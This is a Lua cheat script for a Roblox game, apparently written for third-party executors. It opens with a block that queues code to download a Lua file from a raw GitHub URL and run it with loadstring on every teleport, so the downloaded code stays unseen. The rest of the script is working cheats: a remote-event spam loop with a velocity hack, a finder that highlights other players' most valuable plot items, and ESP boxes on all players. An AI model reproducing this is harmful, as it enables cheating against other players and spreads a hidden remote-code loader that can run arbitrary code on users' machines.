local ADMIN_RAW_URL = "https://raw.githubusercontent.com/temujones1239012i3/11234123123/refs/heads/main/1.lua"
if shared._AutoReloadQueued then return end
shared._AutoReloadQueued = true
local function find_queue()
    if type(queue_on_teleport) == "function" then return queue_on_teleport end
    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
    if secure_load and type(secure_load.queue_on_teleport) == "function" then return secure_load.queue_on_teleport end
    if KRNL and type(KRNL.queue_on_teleport) == "function" then return KRNL.queue_on_teleport end
    for k,v in pairs(_G) do
        if type(v) == "function" and tostring(k):lower():find("queue_on_teleport") then
            return v
        end
    end
    return nil
end
local queue_func = find_queue()
if queue_func and ADMIN_RAW_URL and ADMIN_RAW_URL ~= "" then
    local queued_payload = [[
        local url = "]] .. ADMIN_RAW_URL .. [["
        local function safeGet(u)
            if syn and type(syn.request) == "function" then
                local ok,res = pcall(function() return syn.request({Url=u,Method="GET"}).Body end)
                if ok and res then return res end
            end
            if type(http_request)=="function" then
                local ok,res = pcall(function() return http_request({Url=u}).Body end)
                if ok and res then return res end
            end
            if type(request)=="function" then
                local ok,res = pcall(function() return request({Url=u}).Body end)
                if ok and res then return res end
            end
            if type(game.HttpGet)=="function" then
                local ok,res = pcall(function() return game:HttpGet(u) end)
                if ok and res then return res end
            end
            local HttpService = game:GetService("HttpService")
            local ok,res = pcall(function() return HttpService:GetAsync(u) end)
            if ok and res then return res end
            return nil
        end
        local code = safeGet(url)
        if code then
            local fn = loadstring(code)
            if fn then pcall(fn) end
        end
    ]]
    pcall(function() queue_func(queued_payload) end)
end

local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local FIRE_INTERVAL = 0.1
local SPEED_MULTIPLIER = 5
local GRAPPLE_TOOL_NAME = "Grapple Hook"
local Event = ReplicatedStorage.Packages.Net:WaitForChild("RE/UseItem")
local movementConnection, fireConnection
local isHoldingGrapple = false

local function checkForGrappleHook()
    if character then
        local tool = character:FindFirstChild(GRAPPLE_TOOL_NAME)
        return tool and tool:IsA("Tool")
    end
    return false
end

local function applyDirectVelocity()
    if character and character:FindFirstChild("HumanoidRootPart") and isHoldingGrapple then
        local rootPart = character.HumanoidRootPart
        local moveVector = humanoid.MoveDirection
        if moveVector.Magnitude > 0 then
            local currentVelocity = rootPart.AssemblyLinearVelocity
            rootPart.AssemblyLinearVelocity = Vector3.new(
                moveVector.X * humanoid.WalkSpeed * SPEED_MULTIPLIER,
                currentVelocity.Y,
                moveVector.Z * humanoid.WalkSpeed * SPEED_MULTIPLIER
            )
        end
    end
end

local function fireGrappleHook()
    if isHoldingGrapple then
        pcall(function()
            Event:FireServer(0.70743885040283)
        end)
    end
end

local function startFireLoop()
    if fireConnection then fireConnection:Disconnect() end
    fireConnection = spawn(function()
        while character and character.Parent do
            fireGrappleHook()
            wait(FIRE_INTERVAL)
        end
    end)
end

local function startMovementLoop()
    if movementConnection then movementConnection:Disconnect() end
    movementConnection = RunService.Heartbeat:Connect(function()
        isHoldingGrapple = checkForGrappleHook()
        applyDirectVelocity()
    end)
end

local function initialize()
    startFireLoop()
    startMovementLoop()
end

local function onCharacterAdded(newChar)
    character = newChar
    humanoid = character:WaitForChild("Humanoid")
    isHoldingGrapple = false
    if movementConnection then movementConnection:Disconnect() movementConnection = nil end
    if fireConnection then fireConnection:Disconnect() fireConnection = nil end
    task.wait(1)
    initialize()
end

player.CharacterAdded:Connect(onCharacterAdded)
if character and character.Parent then initialize() end
Players.PlayerRemoving:Connect(function(plr)
    if plr == player then
        if movementConnection then movementConnection:Disconnect() end
        if fireConnection then fireConnection:Disconnect() end
    end
end)

local function applyDecorationsTransparency(parent)
    for _, obj in ipairs(parent:GetDescendants()) do
        if obj:IsA("Folder") and obj.Name == "Decorations" then
            for _, part in ipairs(obj:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.Transparency = 0.4
                end
            end
        end
    end
end

applyDecorationsTransparency(workspace)

workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Folder") and obj.Name == "Decorations" then
        applyDecorationsTransparency(obj)
    elseif obj:IsA("BasePart") and obj.Parent and obj.Parent.Name == "Decorations" then
        obj.Transparency = 0.4
    end
end)

do
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local player = Players.LocalPlayer
	
	local function parseMoney(text)
		text = string.lower(text or "")
		local num = tonumber(text:match("[%d%.]+")) or 0
		if text:find("k") then
			num *= 1e3
		elseif text:find("m") then
			num *= 1e6
		elseif text:find("b") then
			num *= 1e9
		elseif text:find("t") then
			num *= 1e12
		end
		return num
	end
	
	local function abbreviate(n)
		local abs = math.abs(n)
		if abs >= 1e12 then return string.format("%.2ft", n/1e12):gsub("%.0t","t") end
		if abs >= 1e9 then return string.format("%.2fb", n/1e9):gsub("%.0b","b") end
		if abs >= 1e6 then return string.format("%.2fm", n/1e6):gsub("%.0m","m") end
		if abs >= 1e3 then return string.format("%.2fk", n/1e3):gsub("%.0k","k") end
		return tostring(math.floor(n))
	end
	
	local function isBlacklisted(obj)
		while obj do
			local name = string.lower(obj.Name or "")
			if name == "generationboard" or name:find("top") then
				return true
			end
			obj = obj.Parent
		end
		return false
	end
	
	local function findNameFromBillboard(billboard)
		local bestText, bestLen
		for _, d in ipairs(billboard:GetDescendants()) do
			if d:IsA("TextLabel") then
				local t = d.Text or ""
				if not t:find("/s") and not t:find("%$") and not t:find("secret") then
					local trimmed = t:match("^%s*(.-)%s*$")
					if trimmed and #trimmed > 0 then
						if not bestLen or #trimmed > bestLen then
							bestText, bestLen = trimmed, #trimmed
						end
					end
				end
			end
		end
		return bestText
	end
	
	local function getModelForLabel(label)
		local bb = label:FindFirstAncestorWhichIsA("BillboardGui")
		if bb then
			if bb.Adornee and bb.Adornee:IsA("BasePart") then
				local m = bb.Adornee:FindFirstAncestorWhichIsA("Model")
				if m then return m end
			end
			if bb.Parent and bb.Parent:IsA("Model") then
				return bb.Parent
			end
		end
		return label:FindFirstAncestorWhichIsA("Model")
	end
	
	local function getAnyPart(model)
		if not model then return nil end
		return model.PrimaryPart
			or model:FindFirstChild("HumanoidRootPart")
			or model:FindFirstChildWhichIsA("BasePart")
	end
	
	local billboardGui, textLabel, highlight, beam = nil, nil, nil, nil
	local currentModel
	local beamAttachment0, beamAttachment1
	
	local function clearVisuals()
		if billboardGui then billboardGui:Destroy() billboardGui = nil end
		if highlight then highlight:Destroy() highlight = nil end
		if beam then beam:Destroy() beam = nil end
		if beamAttachment0 then beamAttachment0:Destroy() beamAttachment0 = nil end
		if beamAttachment1 then beamAttachment1:Destroy() beamAttachment1 = nil end
		currentModel = nil
	end
	
	local function updateBest()
		local plotsFolder = workspace:FindFirstChild("Plots")
		if not plotsFolder then
			clearVisuals()
			return
		end
		
		local bestLabel, bestValue = nil, -math.huge
		
		for _, bb in ipairs(plotsFolder:GetDescendants()) do
			if bb:IsA("BillboardGui") and not isBlacklisted(bb) then
				for _, lbl in ipairs(bb:GetDescendants()) do
					if lbl:IsA("TextLabel") then
						local text = lbl.Text or ""
						if text:find("/s") and text:find("%$") then
							local val = parseMoney(text)
							if val > bestValue then
								bestValue = val
								bestLabel = lbl
							end
						end
					end
				end
			end
		end
		
		if not bestLabel then
			clearVisuals()
			return
		end
		
		local model = getModelForLabel(bestLabel)
		local part = getAnyPart(model)
		if not (model and part) then
			clearVisuals()
			return
		end
		
		if currentModel == model and textLabel then
			textLabel.Text = string.format("%s | $%s/s", 
				findNameFromBillboard(bestLabel:FindFirstAncestorWhichIsA("BillboardGui")) or model.Name,
				abbreviate(bestValue))
			return
		end
		
		clearVisuals()
		currentModel = model
		
		highlight = Instance.new("Highlight")
		highlight.Name = "BestPetHighlight_Client"
		highlight.FillColor = Color3.fromRGB(0, 255, 0)
		highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
		highlight.FillTransparency = 0.5
		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		highlight.Adornee = model
		highlight.Parent = model
		
		billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = "BestPetBillboard_Client"
		billboardGui.Adornee = part
		billboardGui.Size = UDim2.new(0, 240, 0, 60)
		billboardGui.StudsOffset = Vector3.new(0, 6, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.MaxDistance = 1e6
		billboardGui.Parent = player:WaitForChild("PlayerGui")
		
		textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextScaled = true
		textLabel.TextStrokeTransparency = 0
		textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
		textLabel.Parent = billboardGui
		
		textLabel.Text = string.format("%s | $%s/s", 
			findNameFromBillboard(bestLabel:FindFirstAncestorWhichIsA("BillboardGui")) or model.Name,
			abbreviate(bestValue))
		
		local character = player.Character
		if character then
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if humanoidRootPart then
				beamAttachment0 = Instance.new("Attachment")
				beamAttachment0.Name = "BeamAttachment0_Client"
				beamAttachment0.Parent = humanoidRootPart
				
				beamAttachment1 = Instance.new("Attachment")
				beamAttachment1.Name = "BeamAttachment1_Client"
				beamAttachment1.Parent = part
				
				beam = Instance.new("Beam")
				beam.Name = "BestPetBeam_Client"
				beam.Attachment0 = beamAttachment0
				beam.Attachment1 = beamAttachment1
				beam.Color = ColorSequence.new(Color3.fromRGB(0, 255, 0))
				beam.FaceCamera = true
				beam.Width0 = 0.5
				beam.Width1 = 0.5
				beam.Transparency = NumberSequence.new(0.3)
				beam.Parent = humanoidRootPart
			end
		end
	end
	
	spawn(function()
		while true do
			updateBest()
			task.wait(1)
		end
	end)
end

do
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer

	local visuals = {}

	local BOX_COLOR = Color3.fromRGB(0, 200, 200)
	local NAME_COLOR = Color3.fromRGB(100, 200, 255)
	local BOX_TRANSPARENCY = 0.2

	local function addVisuals(target)
		if visuals[target] then return end
		if target == player then return end

		local function setup(char)
			if not char then return end

			if visuals[target] then
				for _, obj in ipairs(visuals[target]) do
					if obj and obj.Parent then
						obj:Destroy()
					end
				end
			end

			local added = {}

			local box = Instance.new("SelectionBox")
			box.Name = "PlayerBox"
			box.Adornee = char
			box.LineThickness = 0.08
			box.Color3 = BOX_COLOR
			box.SurfaceTransparency = BOX_TRANSPARENCY
			box.Transparency = BOX_TRANSPARENCY
			box.Parent = char
			table.insert(added, box)

			local head = char:FindFirstChild("Head")
			if head then
				local billboard = Instance.new("BillboardGui")
				billboard.Name = "PlayerNameTag"
				billboard.Adornee = head
				billboard.Size = UDim2.new(0, 150, 0, 30)
				billboard.StudsOffset = Vector3.new(0, 3, 0)
				billboard.AlwaysOnTop = true
				billboard.Parent = char

				local nameLabel = Instance.new("TextLabel")
				nameLabel.Size = UDim2.new(1, 0, 1, 0)
				nameLabel.BackgroundTransparency = 1
				nameLabel.Text = target.DisplayName or target.Name
				nameLabel.TextColor3 = NAME_COLOR
				nameLabel.Font = Enum.Font.SourceSansBold
				nameLabel.TextSize = 18
				nameLabel.TextStrokeTransparency = 0.3
				nameLabel.Parent = billboard

				table.insert(added, billboard)
			end

			visuals[target] = added
		end

		setup(target.Character)
		target.CharacterAdded:Connect(setup)
	end

	local function removeVisuals(target)
		if visuals[target] then
			for _, obj in ipairs(visuals[target]) do
				if obj and obj.Parent then
					obj:Destroy()
				end
			end
			visuals[target] = nil
		end
	end

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player then
			addVisuals(plr)
		end
	end

	Players.PlayerAdded:Connect(addVisuals)
	Players.PlayerRemoving:Connect(removeVisuals)
end
